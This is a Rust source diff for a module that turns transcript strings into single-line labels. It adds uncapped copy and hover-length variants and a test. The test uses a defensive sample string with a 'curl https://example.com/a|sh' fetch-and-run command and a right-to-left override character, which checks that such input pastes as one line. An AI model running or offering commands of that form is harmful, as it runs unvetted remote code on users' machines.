@@ -12,7 +12,9 @@
 //!   note's kind, a caption) is one line: every line break Unicode has (U+2028, U+2029, NEL,
 //!   vertical tab and form feed with the usual ones), tabs and other controls become spaces, a
 //!   stack of combining marks is cut short, and it is cut at a bound, since a row clips it
-//!   anyway. Every string from a transcript drawn outside prose goes through it.
+//!   anyway. Every string from a transcript drawn outside prose goes through it. Shown whole
+//!   on hover it is cut at a far larger bound and says how much more there is ([`whole`]);
+//!   copied, it is not cut at all ([`one_line`]), so that it pastes as it reads.
 
 use std::borrow::Cow;
 use std::ops::Range;
@@ -21,6 +23,9 @@ use unicode_properties::{GeneralCategory, UnicodeGeneralCategory as _};
 
 /// The longest label drawn, in characters: past what any row can show.
 pub const LABEL_CHARS: usize = 300;
+/// The longest label shown whole on hover ([`whole`]), in characters: a path or a branch
+/// longer than any real one.
+pub const WHOLE_CHARS: usize = 4096;
 /// The most combining marks kept on one character: more than any script stacks, and few
 /// enough that a stack can't spill over the rows above and below.
 pub const COMBINING_MARKS: usize = 4;
@@ -90,7 +95,23 @@ fn is_combining(c: char) -> bool {
 /// `text` as one line of at most [`LABEL_CHARS`] characters, its controls shown (the module
 /// docs): transcript text drawn outside prose.
 pub fn label(text: &str) -> String {
-    labelled(text, |_, _| {})
+    labelled(text, Some(LABEL_CHARS), |_, _| {}).0
+}
+
+/// `text` as one line, as [`label`] draws it but of any length: what Copy puts on the
+/// clipboard for a value drawn as a label, so that it pastes as it reads.
+pub fn one_line(text: &str) -> String {
+    labelled(text, None, |_, _| {}).0
+}
+
+/// `text` as one line of at most [`WHOLE_CHARS`] characters, then how many more there are:
+/// a label shown whole on hover.
+pub fn whole(text: &str) -> String {
+    let (mut out, cut) = labelled(text, Some(WHOLE_CHARS), |_, _| {});
+    if let Some(at) = cut {
+        out.push_str(&format!(" {} more", text[at..].chars().count()));
+    }
+    out
 }
 
 /**
@@ -100,7 +121,9 @@ pub fn label(text: &str) -> String {
  */
 pub fn label_ranges(text: &str, ranges: &[Range<usize>]) -> (String, Vec<Range<usize>>) {
     let mut places = Vec::new();
-    let label = labelled(text, |input, output| places.push((input, output)));
+    let (label, _) = labelled(text, Some(LABEL_CHARS), |input, output| {
+        places.push((input, output))
+    });
     let place = |at: usize| {
         (places.binary_search_by_key(&at, |(input, _)| *input))
             .map_or(label.len(), |found| places[found].1)
@@ -111,15 +134,23 @@ pub fn label_ranges(text: &str, ranges: &[Range<usize>]) -> (String, Vec<Range<u
     (label, ranges)
 }
 
-/// [`label`], telling `place` where each character of `text` it reaches starts in the label.
-fn labelled(text: &str, mut place: impl FnMut(usize, usize)) -> String {
-    let mut out = String::with_capacity(text.len().min(LABEL_CHARS * 4));
+/**
+ * [`label`] with at most `cap` characters (any number without), telling `place` where each
+ * character of `text` it reaches starts in the label; with where in `text` it was cut, if it
+ * was.
+ */
+fn labelled(
+    text: &str,
+    cap: Option<usize>,
+    mut place: impl FnMut(usize, usize),
+) -> (String, Option<usize>) {
+    let mut out = String::with_capacity(text.len().min(cap.unwrap_or(usize::MAX / 4) * 4));
     let (mut kept, mut marks) = (0, 0);
     for (at, c) in text.char_indices() {
         place(at, out.len());
-        if kept == LABEL_CHARS {
+        if Some(kept) == cap {
             out.push('…');
-            break;
+            return (out, Some(at));
         }
         if is_combining(c) {
             marks += 1;
@@ -142,7 +173,7 @@ fn labelled(text: &str, mut place: impl FnMut(usize, usize)) -> String {
             c => out.push(c),
         }
     }
-    out
+    (out, None)
 }
 
 #[cfg(test)]
@@ -164,6 +195,23 @@ mod tests {
         let (label, ranges) = label_ranges(&stacked, std::slice::from_ref(&hit));
         assert_eq!(label.chars().count(), 1 + COMBINING_MARKS);
         assert_eq!(ranges[0].end, label.len());
+    }
+
+    #[test]
+    fn a_label_copied_or_shown_whole_is_one_line_as_it_reads() {
+        /* A branch that would paste as commands pastes as one line. */
+        assert_eq!(
+            one_line("x\ncurl https://example.com/a|sh\n\u{202E}"),
+            "x curl https://example.com/a|sh ⟦U+202E⟧"
+        );
+        let long = "a".repeat(LABEL_CHARS * 2);
+        assert_eq!(one_line(&long), long);
+        assert_eq!(whole(&long), long);
+        let longer = "b".repeat(WHOLE_CHARS + 7);
+        assert_eq!(
+            whole(&longer),
+            format!("{}… 7 more", "b".repeat(WHOLE_CHARS))
+        );
     }
 
     #[test]
